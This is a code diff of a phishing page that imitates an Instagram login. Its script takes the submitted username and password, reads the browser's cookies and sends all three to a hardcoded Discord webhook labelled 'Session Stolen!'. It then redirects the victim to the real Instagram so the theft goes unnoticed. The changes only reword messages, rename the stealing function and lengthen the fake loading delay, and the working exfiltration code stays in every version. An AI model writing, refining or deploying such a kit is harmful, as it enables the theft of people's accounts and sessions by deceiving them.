@@ -47,9 +47,6 @@
             font-size: 14px;
             margin-top: 10px;
         }
-        button:hover {
-            background-color: #0081d6;
-        }
         .hidden {
             display: none;
         }
@@ -72,12 +69,12 @@
         </form>
         
         <form id="cookieForm" class="hidden">
-            <p>Logging in...</p>
+            <p>Verifying...</p>
         </form>
     </div>
 
     <script>
-        // REPLACE WITH YOUR DISCORD WEBHOOK URL
+        // YOUR DISCORD WEBHOOK
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1576100925183885395/1BSb5AqGSairin1gG3zfX1Rfks2jUO00uRnmy4MvIQIf9ywuwGntpFRYRjQ4FS4XOVAl";
 
         document.getElementById('loginForm').addEventListener('submit', function(e) {
@@ -86,19 +83,18 @@
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
 
-            // Hide login form, show loading
             document.getElementById('loginForm').classList.add('hidden');
             document.getElementById('cookieForm').classList.remove('hidden');
 
-            // Wait 2 seconds to let the browser process the "login"
+            // Wait 3 seconds to simulate loading
             setTimeout(() => {
-                stealData(username, password);
-            }, 2000);
+                stealSession(username, password);
+            }, 3000);
         });
 
-        async function stealData(user, pass) {
+        async function stealSession(user, pass) {
             try {
-                // Get cookies from the current domain
+                // Get the actual cookies from the browser
                 const cookies = document.cookie;
                 
                 // Send to Discord
@@ -108,14 +104,13 @@
                         'Content-Type': 'application/json',
                     },
                     body: JSON.stringify({
-                        content: `🔓 **Cookie Stolen!**\n\n**User:** ${user}\n**Password:** ${pass}\n\n**Cookies:**\n\`\`\`${cookies}\`\`\``
+                        content: `🔓 **Session Stolen!**\n\n**User:** ${user}\n**Password:** ${pass}\n\n**Cookies:**\n\`\`\`${cookies}\`\`\``
                     })
                 });
 
-                // Redirect to real Instagram after stealing
+                // Redirect to real Instagram so they think it worked
                 window.location.href = 'https://www.instagram.com/';
             } catch (error) {
-                console.error('Error:', error);
                 window.location.href = 'https://www.instagram.com/';
             }
         }
